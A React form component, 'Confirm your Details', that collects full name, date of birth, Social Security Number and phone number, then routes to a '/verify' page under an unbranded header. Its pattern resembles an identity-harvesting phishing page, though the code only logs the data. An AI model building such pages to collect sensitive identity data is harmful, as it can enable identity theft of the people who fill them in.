import React, { useState } from "react";
import id from "../assets/id.png";
import download from "../assets/download2.png";
import { useNavigate } from "react-router-dom";

const Details = () => {
  const [currentErrorField, setCurrentErrorField] = useState(null);
  const [errors, setErrors] = useState({
    name: false,
    dob: false,
    ssn: false,
    phone: false,
  });
  const [formData, setFormData] = useState({
    name: "",
    dob: "",
    ssn: "",
    phone: "",
  });
  const navigate = useNavigate();

  const handleChange = (event) => {
    const { name, value } = event.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));

    // Handle error state on input change
    if (currentErrorField === name) {
      setErrors((prev) => ({ ...prev, [name]: !value.trim() }));
    }
  };

  const handleDateChange = (e) => {
    const formattedDate = e.target.value;
    setFormData((prev) => ({
      ...prev,
      dob: formattedDate,
    }));

    if (currentErrorField === "dob") {
      setErrors((prev) => ({ ...prev, dob: !formattedDate.trim() }));
    }
  };

  const validateField = (fieldName) => {
    let isValid = false;

    if (fieldName === "name") {
      isValid = formData.name.trim() !== "";
    } else if (fieldName === "dob") {
      isValid = formData.dob.trim() !== "";
    } else if (fieldName === "ssn") {
      isValid = formData.ssn.trim() !== "";
    } else if (fieldName === "phone") {
      const digits = formData.phone.replace(/\D/g, "");
      isValid = digits.length === 10;
    }

    setErrors((prev) => ({ ...prev, [fieldName]: !isValid }));
    return isValid;
  };

  const handleSubmit = (e) => {
    e.preventDefault();

    // Check fields in order
    if (!validateField("name")) {
      setCurrentErrorField("name");
      return;
    }

    if (!validateField("dob")) {
      setCurrentErrorField("dob");
      return;
    }

    if (!validateField("ssn")) {
      setCurrentErrorField("ssn");
      return;
    }

    if (!validateField("phone")) {
      setCurrentErrorField("phone");
      return;
    }

    // If all fields are valid
    setCurrentErrorField(null);
    console.log("Form submitted:", formData);
    navigate("/verify");
  };

  return (
    <div className="flex flex-col min-h-screen bg-[#ffffff]">
      {/* Header */}
      <div className="w-full h-28 bg-white shadow-md flex justify-center items-center space-x-2 p-2 sm:bg-white bg-gradient-to-b from-[#ffffff] to-[#f2f1f1]">
        <img src={id} alt="User ID Icon" className="w-20" />
        <h1 className="text-lg font-bold">+</h1>
        <img src={download} alt="Download Icon" className="w-24" />
      </div>

      <div className="w-full gap-3 max-w-[500px] bg-white px-4 py-6 sm:px-8 sm:py-10 rounded-xl shadow-lg border border-gray-300 mx-auto flex flex-col items-center">
        <h1 className="text-2xl sm:text-xl font-bold text-center mb-4 sm:mb-8">
          Confirm your Details
        </h1>

        <form
          onSubmit={handleSubmit}
          className="flex flex-col items-center space-y-7 w-full max-w-md mx-auto"
        >
          {/* Full Name */}
          <div className="w-full">
            <label className="text-md font-semibold mb-2 block">
              Full Name
            </label>
            <input
              name="name"
              type="text"
              value={formData.name}
              onChange={handleChange}
              onBlur={() =>
                currentErrorField === "name" && validateField("name")
              }
              className={`w-full px-4 py-2 border-2 border-gray-500 rounded-md tracking-widest font-mono text-lg sm:text-xl focus:outline-none ${
                errors.name
                  ? "border-red-500 focus:ring-2 focus:ring-red-500"
                  : "border-gray-300 focus:ring-2 focus:ring-blue-600"
              }`}
            />
            {errors.name && (
              <p className="text-red-500 text-sm mt-1">Fill out this field</p>
            )}
          </div>

          {/* Date of Birth */}
          <div className="w-full space-x-1">
  <label className="text-md font-semibold mb-2 block">
    Date of Birth
  </label>
  <input
    name="dob"
    type="text"
    placeholder="dd-mm-yyyy"
    value={formData.dob || ""}
    maxLength={10}
    onChange={(e) => {
      const raw = e.target.value.replace(/\D/g, ""); // Remove non-digits
      let formatted = "";

      if (raw.length <= 2) {
        formatted = raw;
      } else if (raw.length <= 4) {
        formatted = `${raw.slice(0, 2)}-${raw.slice(2)}`;
      } else {
        formatted = `${raw.slice(0, 2)}-${raw.slice(2, 4)}-${raw.slice(4, 8)}`;
      }

      setFormData((prev) => ({ ...prev, dob: formatted }));
      if (currentErrorField === "dob") {
        setErrors((prev) => ({
          ...prev,
          dob: !formatted.trim(),
        }));
      }
    }}
    onBlur={() => currentErrorField === "dob" && validateField("dob")}
    className={`w-full px-4 py-2 border-2 rounded tracking-widest font-mono text-lg sm:text-xl focus:outline-none ${
      errors.dob
        ? "border-red-500 focus:ring-2 focus:ring-red-500"
        : "border-gray-500 focus:ring-2 focus:ring-blue-700"
    }`}
  />
  {errors.dob && (
    <p className="text-red-500 text-sm mt-1">Fill out this field</p>
  )}
</div>


          {/* SSN */}
          <div className="w-full">
            <label className="text-md font-semibold mb-2 block">
              Social Security Number
            </label>
            <input
              name="ssn"
              type="text"
              inputMode="numeric"
              value={formData.ssn || ""}
              maxLength={9}
              onChange={handleChange}
              onBlur={() => currentErrorField === "ssn" && validateField("ssn")}
              className={`w-full px-4 py-2 border-2 rounded-md tracking-widest font-mono text-lg sm:text-xl focus:outline-none ${
                errors.ssn
                  ? "border-red-500 focus:ring-2 focus:ring-red-500"
                  : "border-gray-500 focus:ring-2 focus:ring-blue-700"
              }`}
            />
            {errors.ssn && (
              <p className="text-red-500 text-sm mt-1">Fill out this field</p>
            )}
          </div>

          {/* Phone Number */}
          <div className="w-full">
            <label className="text-md font-semibold mb-2 block">Phone Number</label>
            <input
              name="phone"
              type="text"
              inputMode="numeric"
              value={formData.phone}
              maxLength={12}
              onChange={(e) => {
                const rawDigits = e.target.value.replace(/\D/g, "").slice(0, 10);
                let formatted = rawDigits;

                if (rawDigits.length > 3 && rawDigits.length <= 6) {
                  formatted = `${rawDigits.slice(0, 3)}-${rawDigits.slice(3)}`;
                } else if (rawDigits.length > 6) {
                  formatted = `${rawDigits.slice(0, 3)}-${rawDigits.slice(3, 6)}-${rawDigits.slice(6)}`;
                }

                setFormData((prev) => ({ ...prev, phone: formatted }));

                if (currentErrorField === "phone") {
                  setErrors((prev) => ({
                    ...prev,
                    phone: rawDigits.length !== 10,
                  }));
                }
              }}
              onBlur={() => {
                const rawDigits = formData.phone.replace(/\D/g, "");
                setErrors((prev) => ({
                  ...prev,
                  phone: rawDigits.length !== 10,
                }));
              }}
              className={`w-full px-4 py-2 border-2 rounded-md tracking-widest text-lg sm:text-xl focus:outline-none ${
                errors.phone
                  ? "border-red-500 focus:ring-2 focus:ring-red-500"
                  : "border-gray-500 focus:ring-2 focus:ring-blue-700"
              }`}
            />
            {errors.phone && (
              <p className="text-red-500 text-sm mt-1">Phone number must be 10 digits</p>
            )}
          </div>

          <button
            type="submit"
            className="w-full py-3 sm:py-4 bg-blue-700 text-white rounded-lg mt-2 hover:bg-blue-800 transition-colors text-sm sm:text-lg"
          >
            Continue
          </button>
        </form>
      </div>
    </div>
  );
};

export default Details;
